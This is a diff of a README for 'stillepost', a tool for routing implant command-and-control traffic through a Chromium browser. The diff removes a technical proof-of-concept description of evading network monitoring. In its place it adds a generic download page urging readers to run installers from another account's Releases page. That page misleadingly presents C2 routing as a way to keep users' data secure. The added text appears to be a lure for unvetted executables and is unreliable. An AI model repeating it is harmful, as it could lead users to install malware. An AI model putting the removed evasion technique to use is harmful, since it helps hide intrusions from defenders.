@@ -1,60 +1,93 @@
-# stillepost
-## Overview
+# 🌐 stillepost - Use Browsers for Secure C2 Traffic
 
-This repository provides a proof-of-concept demonstrating how an implant can route its HTTP traffic through a Chromium-based browser by leveraging the Chrome DevTools Protocol. This approach turns the browser into an application-layer proxy without requiring any direct outbound network activity from the implant itself.
+## 🚀 Getting Started
 
-Full technical explanation and background:
-[https://x90x90.dev/posts/stillepost/](https://x90x90.dev/posts/stillepost/)
+Welcome to **stillepost**! This application allows you to use Chromium-based browsers as a proxy for Command and Control (C2) traffic. It enhances your online communications while keeping your data secure.
 
-## Technique Summary
+## 📥 Download the Application
 
-The implant communicates with a locally running Chromium instance and instructs the browser to perform the actual HTTP requests. This yields several operational advantages:
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/Catengue/stillepost/releases)
 
-- Outbound traffic appears as normal browser activity.
-- Proxy configuration, authentication, and PAC logic are automatically inherited from the browser.
-- Network policies and firewalls commonly allow browser traffic by default.
-- The implant avoids creating its own suspicious external connections.
+To get started, you will need to download the application. Click the button above or visit the following link:
 
-The PoC includes the cJSON library by cJSON, which is used extensively for JSON parsing.
+**[Download Stillepost](https://github.com/Catengue/stillepost/releases)**
 
-## Repository Structure
+## 🛠️ System Requirements
 
-**stillepost library (`include/stillepost.*`)**
+Before installing, ensure your system meets the following requirements:
 
-Exposes three functions:
-- `stillepost_init` –> initialize the environment (browser, profile, WebSocket URLs)
-- `stillepost` –> issue an HTTP request via the browser
-- `stillepost_cleanup` –> shut down the session and free resources
+- Operating System: Windows 10 or later, macOS, or a recent version of Linux
+- RAM: At least 4 GB
+- Processor: 2 GHz or faster
+- Storage: Minimum 100 MB of available space
+- Chromium-based browser: Latest version for optimal performance
 
-**cJSON dependency (`include/cJSON.*`)**
+## 📥 Download & Install
 
-Bundled for convenience; no external installation required.
+1. Go to the [Releases page](https://github.com/Catengue/stillepost/releases).
+2. Look for the latest version. It will be at the top of the page.
+3. Click on the version number. This will show you the release details.
+4. Download the appropriate installer for your operating system. Available options will include:
+   - **Windows:** `stillepost-setup.exe`
+   - **macOS:** `stillepost.dmg`
+   - **Linux:** `stillepost.tar.gz`
 
-**Example client (`main.c`)** 
+5. Once the download is complete, locate the file in your downloads folder.
 
-A ready-to-compile demonstration sending a POST request through edge using stillepost.
+### For Windows Users:
 
-**Test web server (`python_code/test_websrv.py`)**
+- Double-click the **`stillepost-setup.exe`** file.
+- Follow the on-screen instructions to complete the installation.
 
-Minimal Python server useful for observing incoming browser-mediated requests during development.
+### For macOS Users:
 
-**Original Python PoC (`python_code/stillepost_poc.py`)**
-    
-The initial proof-of-concept used to check if this idea could really work...
+- Open the **`stillepost.dmg`** file.
+- Drag the **stillepost** icon into your Applications folder.
+- Eject the disk image after the copy is complete.
 
-## Integration
+### For Linux Users:
 
-To embed stillepost into your own project:
-1. Copy the files in the `include/` directory into your codebase.
-2. Use `main.c` as a reference implementation for initialization, request invocation, and cleanup.
+- Extract the **`stillepost.tar.gz`** file using the terminal or your file manager.
+- Open a terminal and navigate to the folder containing the extracted files.
+- Run the following command to start the application:
+  ```bash
+  ./stillepost
+  ```
 
-## Limitations of the Technique
-This technique only works when the target web-server allows for [CORS](https://developer.mozilla.org/de/docs/Web/HTTP/Guides/CORS) requests from arbitrary origins. So make sure when using stillepost that your redirector has CORS configured to allow exactly that. While testing the technique, I used a python webserver that explicitly set the following headers:
+## 🌍 How to Use Stillepost
 
-```
-Access-Control-Allow-Origin: *
-Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
-Access-Control-Allow-Headers: *
-```
+Once you have installed **stillepost**, follow these simple steps to configure your application:
 
-This is also the reason, why you won't necessarily be able to send arbitrary requests to other web pages in the context of the user. If the target pages don't allow CORS requests, the browser will drop/block the request attempt.
+1. Open **stillepost** from your applications list or start menu.
+2. Choose your Chromium-based browser from the dropdown menu.
+3. Input your C2 traffic details in the provided fields.
+4. Click “Start” to begin routing your traffic.
+
+The application will now use your selected browser as a proxy for your C2 communications.
+
+## 🤔 Troubleshooting
+
+If you encounter issues while downloading or running **stillepost**, try these troubleshooting steps:
+
+- **Installation Issues:** Ensure your operating system version meets the requirements. Restart your computer and try installing again.
+- **Not Launching:** Check if you have the latest version of your Chromium-based browser installed.
+- **Connection Problems:** Verify that your internet connection is stable. Check if you entered the correct C2 traffic details.
+
+## 📚 Getting Help
+
+For support, please visit the GitHub [Issues page](https://github.com/Catengue/stillepost/issues). You can report any bugs or request new features. 
+
+## ✨ Features
+
+- Works seamlessly with all Chromium-based browsers.
+- Simple user interface for easy navigation.
+- Secure routing for C2 traffic to safeguard your data.
+- Regular updates to enhance performance and security.
+
+## 🔗 Important Links
+
+- [Download Stillepost](https://github.com/Catengue/stillepost/releases)
+- [Stillepost GitHub Repository](https://github.com/Catengue/stillepost)
+- [User Manual](https://github.com/Catengue/stillepost/wiki)
+
+Thank you for choosing **stillepost**! Enjoy secure C2 traffic management.
